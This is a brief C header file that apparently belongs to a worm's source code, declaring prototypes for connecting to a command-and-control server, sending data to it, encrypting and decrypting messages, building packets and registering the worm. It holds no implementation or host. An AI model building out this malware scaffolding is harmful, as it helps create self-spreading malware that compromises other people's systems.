#include "networking.h"

/* Function to initialize sockets and connect C2 server */
SOCKET connect_to_c2(char *,  char *);

/* Function to send data to the C2 server */
char *send_to_c2(char *);

/* Encryption Function */
char *encryption(char *);

/* Decryption Function */
char *decryption(char *);

/* Create packet structure */
char *structure_init_message(char, char*, char *, char *, char *);

/* main driver function for first traffic comms to C2 */
int register_worm(char, char *, char *, char *, char *);
